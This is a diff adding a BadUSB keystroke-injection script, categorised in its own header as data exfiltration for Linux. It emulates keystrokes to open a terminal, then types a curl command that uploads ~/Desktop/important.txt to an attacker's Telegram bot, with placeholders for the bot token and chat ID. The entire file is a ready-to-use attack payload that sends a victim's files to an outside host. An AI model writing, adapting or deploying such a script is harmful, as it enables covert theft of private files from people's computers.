@@ -1,0 +1,22 @@
+REM Title: Linux File Uploader to Telegram
+REM Author: BadUSB Library
+REM Description: Uploads files to Telegram
+REM Target: Linux
+REM Category: Data Exfiltration
+REM Type: Configuration Needed
+
+REM *SETUP*
+REM Replace TELEGRAM_BOT_TOKEN with your Telegram Bot Token
+REM Replace TELEGRAM_CHAT_ID with your Telegram Chat ID
+
+REM Open Terminal
+DELAY 1000
+GUI SPACE
+DELAY 500
+STRING Terminal
+ENTER
+DELAY 2000
+
+REM Upload file to Telegram
+STRING curl -s -X POST "https://api.telegram.org/botTELEGRAM_BOT_TOKEN/sendDocument" -F chat_id="TELEGRAM_CHAT_ID" -F document=@~/Desktop/important.txt
+ENTER
